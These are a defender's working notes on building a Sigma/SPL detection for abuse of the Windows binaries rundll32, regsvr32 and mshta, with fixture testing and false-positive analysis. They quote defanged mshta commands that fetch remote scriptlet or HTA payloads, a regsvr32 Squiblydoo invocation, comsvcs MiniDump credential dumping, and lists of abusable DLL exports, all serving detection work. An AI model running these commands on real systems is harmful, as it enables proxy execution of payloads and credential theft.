# Research notes — T1218.005/010/011 - suspicious binary execution.

*Working notes compiled during rule development. Not polished — this is the actual research trail.*

---

## Hypothesis
This rule will target three official Microsoft binaries that are commonly executed across windows estates, Rundll32, Regsvr32, Mshta. Attackers abuse all three as since they're signed Microsoft binaries this means (a) All trusted by allowlists, (b) network-and-proxy aware, and (c) capable of running script or DLL payloads.


## ATT&CK page & research notes



**MSHTA**
"Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. 
Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility.

Files may be executed by mshta.exe through an inline script: mshta vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))

They may also be executed directly from URLs: mshta http[:]//webserver/payload[.]hta"


**regvsr32**
Used by adversaries to proxy execution of malicious code, it's an exe that can be used to register/ unregister obkect linkining and embedding controls incuding DLLs.
Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. 

**Rundll32**
Abused to proxy malicious code execution. Signed by MS so looks legitimate, adversaries can execute JavaScript/ HTML & control panel items .cpl.

## Data source research

It's clear the best fit for this is using PID captures via sysmon EID 1, filtering down to a single log source which can then be correlated with sysmon EID 3 to detect when the Proccess is making outward connections, a sign of high suspicion.

**Sysmon EIDs**

| Event ID | Meaning |
| --- | --- |
| 1 | Process creation   |
| 3 | Network connection |
| 7 | ImageLoad |
| 10| ProcessAccess |
| 11| FileCreate|

> Correction made during validation: I originally had EID 10 written down as FileCreate. It isn't — 10 is ProcessAccess, 11 is FileCreate. Matters if EID 10 ever gets pulled into the correlation.

### How each event should be used
- Sysmon EID 1: Process creation will be used to spot the initial process launch, the large amount of data captured will be useful for deciding if there is any malicious behavior occuring. 
- Sysmon EID 3: Network connections, all 3 techniques im targetting use official microsoft binaries that have no buisness making outgoing connections, this is 100% suspicious activity.

**Useful for post detection analysis**
- Sysmon EID 7 (ImageLoad): catches loading unusual/ user writable DDL path.
- Sysmon EID 11 (FileCreation): Supporting signal to see if a payload drops a file first, this would be auto monitored and reported on anyway and reported to an incident.

## Existing community rules reviewed

- **[LOLBAS](https://lolbas-project.github.io/)** — the most useful source by a distance. The Rundll32, Mshta and Regsvr32 entries list the actual abusable exports and invocation formats, which is where most of the `rundll_script_abuse` list came from (`shell32,ShellExec_RunDLL`, `advpack,LaunchINFSection`, `url.dll,OpenURL`, `zipfldr,RouteTheCall`, `pcwutl,LaunchApplication`). Not detection rules, but a better starting point than one.
- **SigmaHQ `rules/windows/process_creation/`** — has separate rules per binary and generally per abuse pattern. Good for confirming field names and for the export lists, but they're deliberately atomic and mostly boolean, so a `level: high` fires the same whether it's a remote scriptlet fetch or a shell spawning rundll32. That's the thing I want to avoid here.
- **Red Canary's Threat Detection Report** — worth reading for the baseline problem rather than the logic: rundll32 sits near the top of their most-observed techniques every year, and their write-ups are blunt about how much legitimate rundll32 activity you have to swim through.
- **Casey Smith's original Squiblydoo post** — the `/i:` + `scrobj.dll` mechanics, and why it evades application allow-listing (no payload on disk, no registration left behind).

**Decision**: write my own Sigma rule, then do the scoring in SPL. The community rules cover the *matching* well enough, but none of them grade, and grading is the entire problem with these three binaries — the difference between a useful alert and an unmanageable one is severity, not coverage.


## Detection ideology & architecture

Target T1218.011/010/005 with one sigma yml rule, this will look at the most suspicious occurances for each TTP.
Then I'll create an additional sigma rule for correlation that will use sysmon EID 3 as it's log source to detect network connections following the defence evasion detected.

Following this I will correlate the two- Joining on GUID/ DeviceID and create a well reasoned risk system based on these two tables combined.
I will still allow an event with no network connection to raise a medium/ high alert but when a network connection also occurs it will automatically be raised as a high severity alert.

**Pros**
- Focusing on TTP rather then IOCs while targetting 3 sub techniques, somewhat high risk but if executed correctly it can squash a very common large attack surface well. The reward meets the risk & effort cost well.
- Severity scoring system works well to grade the alert info/med/high based on multiple factors occuring throughout the event process, reducing FP rate while accounting for edge cases.
- Correlating with network traffic is a low effort/risk high reward move.


**Cons**
- Getting false positives right since this is an official exe signed by Microsoft it'll be difficult to keep low FP.
- Complexity of implementation and ongoing maintanance- Since this detection targets 3 different sub Techniques at once testing and tuning all will be cumbersome, in addition to this building two sigma rules will add more complexity and room for maintance to be required since theres multiple fields/ log sources in the mix the chances of one needing a change is relatively high.

- Coverage of all three threats simuntaneously may be weaker then if I made an atomic rule for each- will require tuning inside your environment to ensure low FP rate while catching the threats.

### What I actually built (updated after the SPL round)

The second Sigma rule never got written. Sigma can't score and it can't join two log sources, so a `network_connection` rule would only ever have been a list of "these three binaries connected somewhere" — no way to express "only counts if a process-creation signal already fired", which is the entire point of the network signal. Splitting it in two would also have meant two alerts per incident to correlate back together at the platform layer.

So the EID 3 half went straight into `rule.spl` instead: one search pulling `EventCode=1 OR EventCode=3`, folded to one row per `ProcessGuid` with `stats max()`. `rule.yml` stayed as the portable `process_creation` base and is what Chainsaw tests against. Same design, one less moving part.

The severity plan changed slightly too. "Network connection = automatically High" became `+3, but only when SignalScore >= 1` — a bare proxy binary opening a socket with nothing else suspicious about it shouldn't fire at all, and on a real estate that is a very common event.


## Chainsaw unit batch testing

Created a batch of malicious and benign Windows event logs (real Sysmon EID 1 logs collected via the two `telemetry-generator` scripts), ran the rule against them using Chainsaw via the pytest harness.

### What each set exercises

| # | Malicious | Hits |
| --- | --- | --- |
| 1 | `mal_rundll32_script_abuse` | `shell32.dll,ShellExec_RunDLL` — the script/proxy export list |
| 2 | `mal_rundll32_credential_dumping` | comsvcs MiniDump by ordinal (`#+24`), inert PID |
| 3 | `mal_rundll32_parent` | `cmd → rundll32`, DLL by ordinal out of `\Users\Public\` — the weak-pair branch |
| 4 | `mal_mshta_clsid` | Bare COM `{GUID}` in place of a file path |
| 5 | `mal_mshta_encoded` | ` -enc` token on the mshta command line |
| 6 | `mal_mshta_frombase64string` | `FromBase64String` token on the mshta command line |
| 7 | `mal_regsvr32_parent` | `cscript → .vbs → regsvr32 /s` — script host as parent |
| 8 | `mal_regsvr32_squiblydoo` | Local scriptlet: `scrobj.dll` + `.sct`, no URL |
| 9 | `mal_regsvr32_suspicious_url` | Remote scriptlet: `/i:ftp` (http is creation-blocked by Defender — see validation) |

| # | Benign | Purpose |
| --- | --- | --- |
| 1 | `benign_rundll32_local_dll` | Control Panel routing via `shell32,Control_RunDLL` — the single most common legitimate rundll32 invocation, and the sharpest test of the export list since it's one export away from `ShellExec_RunDLL` |
| 2 | `benign_rundll32_signed_dll` | `advapi32.dll,ProcessIdleTasks` |
| 3 | `benign_rundll32_system_dll` | `user32.dll,UpdatePerUserSystemParameters` |
| 4 | `benign_mshta_local_html` | mshta opening a local script-free HTML by plain file path |
| 5 | `benign_mshta_signed_html` | as above |
| 6 | `benign_mshta_system_html` | as above |
| 7 | `benign_regsvr32_local_dll` | Stand-in for a vendor installer registering a COM DLL from its own directory |
| 8 | `benign_regsvr32_signed_dll` | `/s` on `user32.dll` |
| 9 | `benign_regsvr32_system_dll` | `/s` on `kernel32.dll` |

The three mshta benign cases are near-duplicates. That was a scaffold artefact rather than a decision, and it means the benign mshta baseline is really only one case tested three times.

### Results

Full detail and raw harness output in [validation.md](validation.md); the short version: **18/18 first run, no tuning iterations.**

That's not because the rule is unusually good — it's because I ran the manual trigger round *first* and confirmed every command-line format against real Sysmon telemetry before writing a single selection. The `url.dll,OpenURL` chain, the mshta child spawn, the cscript→regsvr32 parent: all verified in Splunk before they became string matches. Writing the rule from confirmed telemetry instead of from documentation is what removed the tuning loop.

The honest caveat is that nine benign cases prove very little about rundll32. The real benign baseline on a live estate is thousands of Control-Panel and printer invocations a day, and a fixture batch can't simulate the volume where the marginal FPs actually live.

## Atomic Red Team unit batch testing

Not run. Every ART T1218 test on this host is blocked by the EDR at process creation, which means no Sysmon EID 1 is written and there is nothing for the rule to be tested against — an empty result, not a negative one. The inert fixture set exists because of this and covers the same command-line shapes.

Round 2 of validation surfaced the same behaviour in miniature and it's worth recording as a finding rather than an obstacle: `regsvr32 /s /n /u /i:http://…scrobj.dll` is hard-blocked at creation (reproduced 3/3), so classic remote Squiblydoo over http produces **no telemetry at all** on a Defender-protected box. Anything that relies on seeing that command line is relying on the endpoint control having already failed. `/i:ftp` isn't blocked and carries the identical signal, which is what the fixture uses.

The general rule I took from this: Sysmon writes EID 1 at process creation, *before* Defender can kill a merely-flagged process. Flagged-but-spawned still yields a usable event. Only a hard creation block loses it.

### Likely FP sources

- Rundll32 — biggest FP source by far; huge legitimate baseline (Control Panel routing, printer mgmt, installers). Filter on DLL path outside System32/SysWOW64/Program Files, not just presence of rundll32.
- Rundll32, specifically — `advpack.dll,LaunchINFSection` and `setupapi.dll,InstallHinfSection` are in my script-abuse list at weight 2, and legitimate installers genuinely use both. Left them in: they're abused often enough to be worth the noise, and the tuning answer is an allow-list on the specific installer command line rather than dropping the export.
- Regsvr32 — routine software install/uninstall (older ActiveX apps, Java, legacy Office). Watch for SCCM/Intune deployment bursts across many hosts at once.
- Mshta — lower baseline, but legacy internal admin tools and older LOB installers still use HTA.

### Blind spots & assumptions

- Assumes Sysmon is running and untampered — an attacker who kills/unloads it defeats the rule set entirely. Needs a companion check on Sysmon service state.
- Command-line string matches (e.g. /i:http) are brittle against case/encoding obfuscation.
- Detection keys on Image name/path — binary renaming bypasses it unless OriginalFileName is also checked. Handled on EID 1, but the EID 3 filter is still on Image, so a renamed binary loses the network correlation.
- "No network = lower severity" assumes live, single-stage execution — staged payloads may show zero network activity and land only in the medium bucket.
- No coverage for remote-triggered execution (WMI/PsExec/WinRM) — only covers local/interactive chains.
- **The jump-process gap.** If rundll32 launches something else — powershell, say — and *that* does the work, this rule sees the proxy binary and nothing more. The child owns the network connection, so the EID 3 correlation misses too and both halves of the detection fail together. Deliberately out of scope here, but it means the T1059.001 rule has to treat rundll32/mshta/regsvr32 as suspicious *parents*, otherwise the handoff falls straight down the gap between the two rules.
